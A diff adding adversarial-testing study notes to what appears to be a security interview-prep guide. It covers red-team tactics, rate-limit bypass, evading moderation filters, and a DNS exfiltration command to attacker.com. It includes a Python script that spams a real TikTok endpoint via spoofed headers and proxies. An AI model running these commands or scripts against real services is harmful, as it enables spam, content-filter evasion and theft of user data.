@@ -234,6 +234,102 @@ Learn privacy engineering fundamentals and align security measures without over-
 - *Q: What is adversarial testing vs pentesting?*  
   **A:** “Adversarial testing simulates a strategic attacker aiming to break systems assuming defenders are alert. It goes beyond scanning: you might fuzz endpoints to bypass rate limits, craft ML inputs to poison content filters, or test lateral movement within the infra. It’s about breaking assumptions and validating controls under active threat.”
 
+```bash
+# Adversarial Testing Notes
+
+## 1. Definition: Adversarial Testing vs Pentesting
+
+| **Aspect**          | **Adversarial Testing**                          | **Traditional Pentesting**               |
+|----------------------|------------------------------------------------|------------------------------------------|
+| **Goal**             | Simulate advanced attackers (red team)         | Find vulnerabilities (checklist-based)   |
+| **Scope**            | End-to-end system abuse (e.g., ML, APIs, infra)| Focus on CVEs & misconfigurations        |
+| **Approach**         | Breaks assumptions (e.g., "rate limits work")  | Follows OWASP/SANS methodologies        |
+| **Output**           | Tactics, Techniques, Procedures (TTPs)         | Vulnerability reports                   |
+
+>Starting from a vulnerable Jenkins service (CVE-2019-1003000), the red team gained initial access and escalated privileges using a misconfigured Windows service. Using credential dumping via LSASS memory, the team harvested domain admin credentials and moved laterally to the domain controller. A scheduled task was created to maintain persistence. Sensitive finance documents were exfiltrated via encrypted Sliver C2 tunnels. No alerts were triggered during the operation. Actions were mapped to MITRE ATT&CK to identify detection gaps
+
+**Key Difference**:  
+Adversarial testing answers: *"Can we stop a determined attacker?"* not just *"Are we vulnerable?"*
+
+---
+
+## 2. Adversarial Testing Plan for TikTok-like Service
+
+### **Objective**:  
+Test resilience against strategic attacks on:  
+- Rate limiting  
+- Content moderation (ML poisoning)  
+- Data exfiltration  
+
+### **Attack Scenarios**
+
+#### **A. Rate Limit Bypass**  
+**Tactic**: Overload API endpoints to bypass throttling.  
+**Steps**:  
+1. Identify rate-limited endpoints (e.g., `/api/comment`).  
+2. Test:  
+   - Header manipulation (`X-Forwarded-For` spoofing).  
+   - Distributed calls from multiple IPs (Burp Intruder + proxies).  
+   - Alternate encoding (`%0a`, `\n` in JSON).  
+
+**Success Criteria**:  
+- Post >500 comments/sec (threshold breach).  
+
+#### **B. ML Poisoning**  
+**Tactic**: Fool content filters to allow harmful content.  
+**Steps**:  
+1. Collect benign/harmful training samples (e.g., "safe" vs "hate" speech).  
+2. Craft adversarial inputs:  
+   - **Text**: Unicode homoglyphs (`Hèllo` vs `Hello`).  
+   - **Images**: Perturbations (FGSM attack) to bypass nudity filters.  
+
+**Success Criteria**:  
+- 30%+ harmful content slips past moderation.  
+
+#### **C. Data Exfiltration**  
+**Tactic**: Steal user data despite encryption/WAFs.  
+**Steps**:  
+1. Find indirect data leaks:  
+   - **Side channels**: Response timing on `/?username=admin`.  
+   - **Error messages**: Trigger SQL-like errors in NoSQL endpoints.  
+2. Exfiltrate via:  
+   - DNS tunneling (`userdata.attacker.com`).  
+   - Steganography in profile pics.  
+
+**Success Criteria**:  
+- Extract 100+ user emails without triggering alerts.  
+
+---
+
+## 3. Tools & Techniques
+
+| **Tool**           | **Use Case**                          | **Example Command**                     |
+|--------------------|--------------------------------------|----------------------------------------|
+| **Burp Suite**     | API fuzzing, traffic manipulation    | `Intruder` for rate-limit bypass       |
+| **Frida**          | Runtime ML model manipulation        | Hook `predict()` function in Android   |
+| **Metasploit**     | Lateral movement                     | `exploit/multi/handler` for callbacks  |
+| **DNSExfiltrator** | Data exfiltration                    | `dnsexfiltrator.py -d attacker.com -f data.txt` |
+
+---
+
+## 4. Example Adversarial Test (Mini Plan)
+
+**Target**: TikTok-like comment system.  
+**Goal**: Bypass rate limits + post spam.  
+
+```python
+import requests
+from multiprocessing import Pool
+
+def spam_comment(proxy):
+    headers = {"X-Forwarded-For": proxy}
+    requests.post("https://api.tiktok.com/comment", 
+                 data={"text": "BUY_VIAGRA"}, 
+                 headers=headers)
+
+# Use 50 proxies to bypass IP-based rate limiting
+Pool(50).map(spam_comment, open("proxies.txt"))
+```
 ---
 
 ##  Day 2 — Deep reviews, mocks & code practice
